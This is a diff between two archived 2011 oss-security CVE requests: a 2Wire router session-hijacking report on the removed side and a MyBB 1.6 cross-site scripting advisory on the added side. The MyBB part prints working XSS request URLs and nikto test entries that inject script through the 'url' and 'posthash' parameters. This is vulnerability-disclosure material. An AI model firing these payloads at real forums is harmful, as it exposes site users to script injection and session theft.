@@ -1,113 +1,101 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/10
-Message-ID: <AANLkTi=KiLQp=BR1Y7Nm8XU7u73TuJsNonQJ5PJPLB-D@mail.gmail.com>
-Date: Fri, 18 Mar 2011 14:40:59 +0800
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/7
+Message-ID: <AANLkTim6g4-8hbtUewtY-=yOKt9H=X79KeCpE_OvDEEa@mail.gmail.com>
+Date: Fri, 18 Mar 2011 14:17:35 +0800
 From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-Subject: CVE Request: 2Wire Broadband Router Session Hijacking Vulnerability
+Subject: CVE Request: MyBB 1.6 <= Cross Site Scripting Vulnerability
 Content-Type: text/plain; charset=utf-8
 
 1. OVERVIEW
 
-The 2Wire Broadband Router is vulnerable to Session Hijacking flaw
-which attackers can compromise the router administrator session.
+MyBB was vulnerable to Cross Site Scripting.
 
 
-2. PRODUCT DESCRIPTION
+2. APPLICATION DESCRIPTION
 
-2Wire routers, product of 2Wire, are widely-used Broadband routers in
-SOHO environment.
-They are distributed through most famous ISPs (see -
-http://2wire.com/?p=383) with ready-to-use pre-configured settings.
-Their Wireless SSIDs are well-known as "2WIRE" prefix.
+MyBB is a free bulletin board system software package developed by the
+MyBB Group.
+It's supposed to be developed from XMB and DevBB bulletin board applications.
 
 
 3. VULNERABILITY DESCRIPTION
 
-The web-based management interface of 2Wire Broadband router does not
-generate truely unique random session IDs for a logged-in
-administrator user.
-This allows attackers to brute-force guess a valid session ID to
-compromise the administrator session.
-For more information about this kind of weekness,
-refer to CWE-330: Use of Insufficiently Random Values and CWE-331:
-Insufficient Entropy.
+Two XSS vulnerabilities were found. One is user-driven XSS on "url" parameter.
+User will get xssed upon successful log-in.
+The other is a reflected XSS on "posthash" parameter where the valid
+tid (topic id) is required for successful attack.
+The anti-CSRF check against "my_post_key" parameter was not done in
+thread/post preview mode and thus there came a way for XSS to be
+successful.
 
 
 4. VERSIONS AFFECTED
 
-Tested against:
-Model: 2700HGV-2 Gateway
-Hardware Version: 2700-100657-005
-Software Version: 5.29.117.3
-
-Other versions might be affected as well.
+MyBB 1.6 and lower
 
 
 5. PROOF-OF-CONCEPT/EXPLOIT
 
-http://yehg.net/lab/pr0js/advisories/2wire/session_analysis/session_tokens_captured_webscarab
-http://yehg.net/lab/pr0js/advisories/2wire/session_analysis/session_tokens_captured_burp
-http://yehg.net/lab/pr0js/advisories/2wire/session_analysis/session_analysis_with_burp.jpg
-http://yehg.net/lab/pr0js/advisories/2wire/session_analysis/session_analysis_with_burp-02.jpg
-http://yehg.net/lab/pr0js/advisories/2wire/session_analysis/session_analysis_with_burp-03.jpg
-http://yehg.net/lab/pr0js/advisories/2wire/session_analysis/session_analysis_with_burp-04.jpg
+User-driven XSS
+http://attacker.in/mybb/member.php?action=login&url=javascript:alert%28/XSS/%29
+
+Reflected XSS
+http://attacker.in/mybb/newreply.php?my_post_key=&subject=XSS&action=do_newreply&posthash="><script>alert(/XSS/)</script>&quoted_ids=&lastpid=1&from_page=1&tid=1&method=quickreply&message=test&previewpost=Preview
+Post
+
+Or try nikto udb_tests
+
+"400003","0","4","/member.php?action=login&url=javascript:alert(/XSS/)","GET","<input
+type=\"hidden\" name=\"url\" value=\"javascript:alert(/XSS/)\"
+/>","","","<input type="hidden" name="url" value=\"\" />","","MyBB 1.6
+<= Cross Site Scripting,  ref:
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting","",""
+
+"400004","0","4","/newreply.php?my_post_key=&subject=XSS&action=do_newreply&posthash=\"><script>alert(/XSS/)</script>&quoted_ids=&lastpid=1&from_page=1&tid=1&method=quickreply&message=test&previewpost=Preview
+Post","GET","<input type="hidden" name="posthash"
+value=""><script>alert(/XSS/)</script>" />","","","<input
+type="hidden" name="url" value=\"\" />","","MyBB 1.6 <= Cross Site
+Scripting,  ref:
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting","",""
 
 
-6. IMPACT
+6. SOLUTION
 
-Attackers can compromise 2wire administrator session through automated
-tools and modify any settings they want.
-
-
-7. SOLUTION [from 2wire]
-
-2wire has already investigated and provided a fix for this issue.
-These fixes have been implemented in the 6.x series of software and
-are available to our partners.
-Since 2wire does not provide software releases to end-users, it is up
-to the partner ISP to
-adopt new versions and provide them to their customers.
+Upgrade to 1.6.1
 
 
-8. VENDOR
+7. VENDOR
 
-2Wire Inc
-http://www.2wire.com
-About 2Wire - http://www.2wire.com/index.php?p=486
+MyBB Development Team
+http://www.mybb.com/
 
 
-9. CREDIT
+8. CREDIT
 
 This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
 Ethical Hacker Group, Myanmar.
 
 
-10. DISCLOSURE TIME-LINE
+9. DISCLOSURE TIME-LINE
 
-07-25-2010: vulnerability discovered
-07-29-2010: notified vendor
-08-02-2010: vendor responded/verified
-08-09-2010: vendor did not respond when fix/upgrade would be available
-08-09-2010: vulnerability disclosed
-08-21-2010: vendor released fix
+2010-12-09: notified vendor
+2010-12-15: vendor released fixed version
+2010-12-20: vulnerability disclosed
 
 
-11. REFERENCES
+10. REFERENCES
 
 Original Advisory URL:
-http://yehg.net/lab/pr0js/advisories/2wire/[2wire]_session_hijacking_vulnerability
-Other unfixed 2Wire Vulnerabilities: http://www.hakim.ws/
-2Wire Routers WorldWide: http://www.shodanhq.com/?q=2Wire
-Related WebGoat Lesson:
-http://yehg.net/lab/pr0js/training/view/owasp/webgoat/WebGoat_SessionMan_SessionHijackingWithJHijack/
-Related: http://jeremiahgrossman.blogspot.com/2008/04/intranet-hack-targeting-at-2wire-dsl.html
-Related: http://www.routerzone.eu/wiki/index.php/Hacking_the_2Wire_1800
+http://yehg.net/lab/pr0js/advisories/[mybb1.6]_cross_site_scripting
+Vendor ChangeLog:
+http://blog.mybb.com/2010/12/15/mybb-1-6-1-release-1-4-14-update/
+About MyBB: http://www.mybb.com/about/mybb
 
 
-#yehg [08-09-2010]
+#yehg [2010-12-20]
 
-updated: 2010-10-24
+#last updated at 2010-12-23
 ---------------------------------
 Best regards,
 YGN Ethical Hacker Group
